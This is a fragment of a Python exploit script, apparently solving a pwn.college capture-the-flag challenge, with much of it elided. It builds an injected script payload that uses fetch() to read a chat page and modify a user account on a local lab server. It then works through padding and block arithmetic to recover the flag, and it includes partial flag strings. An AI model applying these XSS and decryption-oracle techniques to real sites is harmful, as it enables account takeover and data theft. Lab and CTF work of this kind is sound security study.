...
def alice_msg(recipient, msg):
    ...
    return '<script>\
fetch("http://127.0.0.1/chat/' + recipient + '", \
...
fetch("http://127.0.0.1/user/' + user + '/modify", \
{headers:{"Content-Type": "application/x-www-form-urlencoded"}, \
...
msg_ini = sharon_username + ": The flag is pwn.college{48mrP3XHwLp3WbCwWsRXyt91G46"
#msg_ini = sharon_username + ": The flag is pwn.college{QfSjMDd9bIGeoQDBQ3jvQ73Ta-B.0VN3gjNxwiN0gDOx"

padding_len = 15 - (len(msg_ini) % 16)
blk = math.floor(len(msg_ini)/16)
#print(f"pagging_len_ini: {padding_len}  |  blk_ini: {blk}")
...
while True:
    ...
    if cur_sharon_username != new_sharon_username:
